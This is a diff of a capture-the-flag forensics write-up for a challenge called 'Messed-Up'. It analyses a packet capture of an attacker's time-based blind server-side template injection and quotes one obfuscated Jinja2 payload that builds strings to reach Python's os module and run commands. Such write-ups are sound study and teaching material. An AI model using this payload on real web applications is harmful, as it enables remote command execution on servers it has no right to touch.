@@ -7,9 +7,9 @@ Messed-Up
 ## Hint Soal
 - It's been a while, since I managed my task in a proper order
 
+---
 
 ## Penjelasan Penyelesaian Soal
-
 Given a `xz compressed` file, contained packet-capture file named `messed-up.pcap`.<br><br>
 Based on `static analysis`, we found several improper `packet.frame` like negative `time difference` & weird `3-way of handshake` (ACK packet without preceeded SYN-ACK or SYN packet) 
 
@@ -72,7 +72,7 @@ We also found a response `Non-number operation are not supported` that implies `
 
 Furthermore, we also found that `attacker` tried to conduct `Blind Injection` using `delay time` as the indicator. For example:
 
-```
+```bash
 # Payload we found:
 
 {% set p = request[email[54]+email[-61]+email[35]+email[-59]+email[-95]+email[-70]+email[-42]+email[-21]+email[-95]+email[-47]+email[79]][email[32]+email[-64]+email[71]+email[37]+email[49]+email[2]+email[-42]+email[37]+email[68]+email[-64]+email[32]][email[32]+email[-64]+email[-94]+email[45]+email[1]+email[37]+email[75]+email[1]+email[79]+email[68]+email[32]+email[32]][email[32]+email[-64]+email[1]+email[9]+email[35]+email[49]+email[36]+email[-21]+email[32]+email[-64]](email[-47]+email[68])[email[35]+email[49]+email[35]+email[80]+email[-17]] %}{% if p(email[35]+email[-11]+email[-53])[email[-60]+email[-16]+email[54]+email[-53]]()[5][email[32]+email[32]+email[-16]+email[48]+email[-64]+email[-64]](email[-42]) %} {{ p(email[-28]+email[37]+email[80]+email[-16]+email[35]+email[72]+email[-12]+email[11]+email[56]+email[57])[email[-60]+email[80]+email[-42]+email[43]]() }} {% endif %}
